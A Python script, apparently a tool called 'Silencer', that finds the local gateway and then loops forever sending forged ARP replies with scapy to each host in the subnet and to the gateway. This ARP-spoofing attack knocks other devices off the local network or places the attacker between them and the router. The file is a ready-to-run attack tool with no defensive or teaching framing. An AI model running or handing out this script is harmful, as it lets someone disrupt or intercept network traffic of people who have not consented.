import scapy.all as scapy
import time
import socket
import netifaces
from colorama import Fore, Back, Style
import subprocess
import os

if not 'SUDO_UID' in os.environ.keys():
    print("Try running this program with sudo.")
    exit()

clear = subprocess.run('clear', shell = True)

def gateway_ip():
    gws = netifaces.gateways()
    return list(gws['default'].items())[0][1][0]
def your_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname( )[ 0 ]

#--------------------------------------------------
your_ip = your_ip()
gateway = gateway_ip()
interval = 0
#--------------------------------------------------

#--------------------------------------------------
print(Fore.MAGENTA + "▒█▀▀▀█ ▀█▀ ▒█░░░ ▒█▀▀▀ ▒█▄░▒█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀█\n"
      "░▀▀▀▄▄ ▒█░ ▒█░░░ ▒█▀▀▀ ▒█▒█▒█ ▒█░░░ ▒█▀▀▀ ▒█▄▄▀\n"
      "▒█▄▄▄█ ▄█▄ ▒█▄▄█ ▒█▄▄▄ ▒█░░▀█ ▒█▄▄█ ▒█▄▄▄ ▒█░▒█")


print(Fore.BLUE + Style.BRIGHT + "_______________________________________________\n")
print(Fore.LIGHTYELLOW_EX + "[*]Your IP: " + your_ip)
print("[*]Your gateway IP: " + gateway)
print(Fore.BLUE +"_______________________________________________")
#--------------------------------------------------

try:
    ip_range = int(input(Fore.MAGENTA + "[*]Enter ip range (enter 0 if you don't know what it is): " + Back.RESET))
    if ip_range == 0:
        ip_range = 24
except:
    ip_range =  int(input(Fore.MAGENTA + "[*]Enter ip range (enter 0 if you don't know what it is): " + Fore.RESET))
    if ip_range == 0:
        ip_range = 24
print(Fore.BLUE + "[*]Your network will become less busy for a few minutes...\n" + Fore.RED + "[*]Ctrl + Z to exit" + Fore.RESET)



def spoof(target,gateway):
    packet = scapy.ARP(op = 2, pdst = target, hwdst = scapy.getmacbyip(target), psrc=gateway)
    scapy.send(packet, verbose = False)
while True:
    try:
        network_ip = gateway[:len(gateway)-2]
        for x in range(ip_range) :
            target = f'{network_ip}.{x}'
            if target == your_ip:
                continue
            elif target == gateway:
                continue
            elif x == 0:
                continue
            spoof(target, gateway)
            spoof(gateway, target)
            time.sleep(interval)
    except:
           continue

